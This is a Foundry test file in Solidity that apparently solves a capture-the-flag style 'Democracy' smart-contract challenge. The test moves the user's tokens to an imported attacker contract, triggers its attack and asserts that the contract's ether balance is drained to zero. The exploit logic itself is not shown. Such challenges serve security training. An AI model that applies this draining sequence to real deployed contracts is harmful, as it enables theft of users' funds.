// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Democracy, DemocracyAttackerFactory, DemocracyAttacker} from "../src/Democracy.sol";

contract DemocracyTest is Test {
    Democracy public democracy;
    DemocracyAttackerFactory public attackerFactory;
    DemocracyAttacker public attacker;
    address user = address(0x1);

    function setUp() public {
        democracy = new Democracy{value: 1 ether}();
        // vm.deal(address(democracy), 1000 ether);
        require(address(democracy).balance == 1 ether, "did not fund democracy");
    }

    function test_Attack() public {
        attackerFactory = new DemocracyAttackerFactory();
        attacker = new DemocracyAttacker(democracy, user, address(attackerFactory));
        democracy.nominateChallenger(user);

        assertEq(democracy.balanceOf(user), 2);
        vm.startPrank(user);
        democracy.safeTransferFrom(user, address(attacker), 0);
        democracy.safeTransferFrom(user, address(attacker), 1);
        assertEq(democracy.balanceOf(user), 0);
        assertEq(democracy.balanceOf(address(attacker)), 2);
        vm.stopPrank();

        attacker.attack();
        vm.prank(user);
        democracy.withdrawToAddress(user);
        assertEq(address(democracy).balance, 0);
    }
}
